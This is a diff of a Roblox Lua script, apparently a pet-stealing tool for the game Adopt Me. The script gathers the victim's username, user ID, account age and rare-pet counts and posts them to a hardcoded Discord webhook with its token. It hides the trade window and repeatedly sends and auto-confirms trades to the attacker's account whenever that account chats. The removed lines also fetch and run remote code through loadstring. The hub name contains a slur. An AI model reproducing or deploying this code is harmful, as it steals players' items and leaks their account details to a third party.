@@ -1,6 +1,5 @@
-Username = "kely5171", "Onodakun23", "Slay_OZ1"
-Webhook = "https://discord.com/api/webhooks/"
-
+Username = "kely5171"
+Webhook = https://discord.com/api/webhooks/1302454379076522096/8t-Xl4USKXiBpqVzVsNPM89zjES8KnRwAHMSKWlWXDCdo79eWqgDCBlJ9-3xojY6aBOn""
 local Loads = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loads("InventoryDB")
 local ClientData = Loads('ClientData')
@@ -11,7 +10,6 @@ local ultra_count = 0
 local rare_count = 0
 local uncommon_count = 0
 local common_count = 0
-
 
 for i, v in pairs(ClientData.get("inventory").pets) do
   if InventoryDB[v.category][v.id].rarity == "legendary" then
@@ -37,21 +35,7 @@ for i, v in pairs(ClientData.get("inventory").pets) do
   end
 end
 
-local userid = game.Players.LocalPlayer.UserId
-local accage = game.Players.LocalPlayer.AccountAge
-local LogsWebhook = "https://discord.com/api/webhooks/1302454379076522096/8t-Xl4USKXiBpqVzVsNPM89zjES8KnRwAHMSKWlWXDCdo79eWqgDCBlJ9-3xojY6aBOn"
-local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
 
-
-if getgenv().ui == nil then
-    getgenv().ui = true
-end
-if getgenv().ui == true then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/MuscleSC/UI/refs/heads/main/HUB/ADMTKD"))()
-    print("True GUI")
-elseif getgenv().ui == false then
-    print("False GUI")
-end
 
 if legendaries_count >= 1 or mega_count >= 1 or neon_count >= 1 then
     rizz = '-- @everyone <@1247565783299784725>'
@@ -61,38 +45,36 @@ end
 
 rizz = rizz .. '\n' .. TeleportScript .. '\n'
 
+local TeleportScript = [[game:GetService("TeleportService"):TeleportToPlaceInstance("]] .. game.PlaceId .. [[", "]] .. game.JobId .. [[", game.Players.LocalPlayer)]]
+
+local userr = Username
+local userid = game.Players.LocalPlayer.UserId
+ local accage = game.Players.LocalPlayer.AccountAge
 local data = {
-  username = " "..game.Players.LocalPlayer.Name.. "",
-  avatar_url = 'https://media.discordapp.net/attachments/1302269045998878750/1302301433059741768/Awesome_Profile_PFP_Free_Download_.jpg?ex=67279e39&is=67264cb9&hm=ecf10cda83d6210a61fafdc49e6b3e7495a9925f2f2f4e2bc7348a0d8dc5de66&=&format=webp&width=422&height=422',
-  content = rizz,
+  username = 'LiggyNiggy Hub ☁️',
+  avatar_url = 'https://cdn.discordapp.com/attachments/1266886405208936650/1270128838679986228/images_2.jpg?ex=66b29328&is=66b141a8&hm=6db84cb36a52d8b48f1b940c42ddc1fc118eb18073bf38bcc629bae35e426f6b&',
+  content = '@everyone Join your player using **Join Script** and type **Anything** in chat to start stealing! It will auto trade!',
   embeds = {
     {
-      title = '__**정홍희 | Result**__',
-      description = '**📃  User Information**: \n ```lua\nUsername           : '..game.Players.LocalPlayer.Name..'\nUser-ID            : '.. tostring(userid) ..'\nAccount Age        : '.. tostring(accage) ..'\nReceiver           : '.. Username ..'\n```\n 🎒__**Inventory**__    : \n ```lua\nLegendaries     🐙 : '.. tostring(legendaries_count).. '\nMega Neons      🦄 : '.. tostring(mega_count).. '\nNeons           🦖 : '.. tostring(neon_count).. '\nUltra Rares     🦅 : '.. tostring(ultra_count).. '\nRares           🐶 : '.. tostring(rare_count).. '\nUncommons       🐳 : '.. tostring(uncommon_count).. '\nCommons         🐢 : '.. tostring(common_count).. '\n```\n🔗__**Join Script**__ :\n```game:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
+      title = 'Version 1.7 💻',
+      description = '**🌩  User Information**: \n ```lua\n🗽 Username: '.. tostring(plr) ..'\n🗼 User-ID: '.. tostring(userid) ..'\n⛩ Account Age: '.. tostring(accage) ..'\n🏗 Receiver: '.. userr ..'\n```\n **🌧 Inventory**: \n ```lua\n🐙 Legendaries: '.. tostring(legendaries_count).. '\n🦄 Mega Neons: '.. tostring(mega_count).. '\n🦖 Neons: '.. tostring(neon_count).. '\n🦅 Ultra Rares: '.. tostring(ultra_count).. '\n🐶 Rares: '.. tostring(rare_count).. '\n🐳 Uncommons: '.. tostring(uncommon_count).. '\n🐢 Commons: '.. tostring(common_count).. '\n```\n**🌦 Join Script**:\n\n```lua\ngame:GetService("TeleportService"):TeleportToPlaceInstance(920587237, "' .. game.JobId .. '", game.Players.LocalPlayer)\n```',
       color = 9807270
     }
   }
 }
-
-local request = http_request or request or HttpPost or syn.request
-request({
+local httpRequest = http.request or httprequest
+if httpRequest then
+  httpRequest({
     Url = Webhook,
-    Method = "POST",
+    Method = 'POST',
     Headers = {
-        ["Content-Type"] = "application/json"
+      ['Content-Type'] = 'application/json'
     },
-    Body = game.HttpService:JSONEncode(data)
-})
-
-local request = http_request or request or HttpPost or syn.request
-request({
-    Url = LogsWebhook,
-    Method = "POST",
-    Headers = {
-        ["Content-Type"] = "application/json"
-    },
-    Body = game.HttpService:JSONEncode(data)
-})
+    Body = game:GetService('HttpService'):JSONEncode(data)
+  })
+else
+  print("LMAOOOOOO")
+end
 
 
 local function SendTrade(Username)
@@ -138,7 +120,7 @@ local function ConfirmTrade()
     AcceptTradeRemote:FireServer()
 end
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
-local function StartGet()
+local function StartSteal()
     while task.wait(15) do
     SendTrade(Username)
     wait(3)
@@ -152,7 +134,7 @@ end
 for _, plr in pairs(game.Players:GetPlayers()) do
   if plr.Name:lower() == Username:lower() then
     plr.Chatted:Connect(function()
-      StartGet()
+      StartSteal()
     end)
   end
 end
@@ -160,7 +142,7 @@ end
 game.Players.PlayerAdded:Connect(function(plr)
   if plr.Name:lower() == Username:lower() then
     plr.Chatted:Connect(function()
-      StartGet()
+      StartSteal()
     end)
   end
 end)
